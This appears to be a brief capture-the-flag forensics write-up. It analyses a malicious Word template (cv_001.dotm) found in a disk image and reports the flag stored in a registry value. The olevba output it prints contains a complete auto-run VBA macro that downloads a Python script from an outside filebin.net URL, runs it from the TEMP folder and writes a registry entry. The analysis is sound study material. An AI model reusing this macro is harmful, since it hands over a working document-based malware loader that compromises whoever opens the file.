chal 

```
What is the value of the registry entry that was stored by the macro?
```

we open the ad1 image and in the directory `C:\Users\challenge\Downloads` we find  a `.dotm` file
```
olevba 0.60.1 on Python 3.10.12 - http://decalage.info/python/oletools
===============================================================================
FILE: cv_001.dotm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Sub AutoOpen()
    DownloadAndOpenFile
    RegistryEntry
End Sub

Sub Document_Open()
    DownloadAndOpenFile
    RegistryEntry
End Sub


Sub RegistryEntry()
    Dim keyName As String
    Dim data As String
    Dim path As String
    Dim myWS As Object
    Dim stype As String
    Set myWS = VBA.CreateObject("WScript.Shell")

    path = "HKEY_CURRENT_USER\Software\Uninstall\"
    keyName = "Application"
    keyValue = "fA3bDt"
    stype = "REG_SZ"
    myWS.RegWrite path & keyName, keyValue, stype
End Sub

Sub DownloadAndOpenFile()
    Dim url As String
    Dim destinationPath As String
    Dim shell As Object
    Dim pythonPath As String
    Dim command As String
    pythonPath = "python.exe"
    url = "https://filebin.net/g5lap7a613mo3x3o/client.py"
    destinationPath = Environ("TEMP") & "\msserver.py"
    With CreateObject("MSXML2.ServerXMLHTTP")
        .Open "GET", url, False
        .send
        If .Status = 200 Then
            Dim stream As Object
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write .responseBody
            stream.SaveToFile destinationPath, 2
            stream.Close
        End If
    End With
    command = pythonPath & " " & Chr(34) & destinationPath & Chr(34)
    Set shell = CreateObject("WScript.Shell")
    shell.Exec command
End Sub
```

therefore the value of the registry was the flag 

flag{fA3bDt}
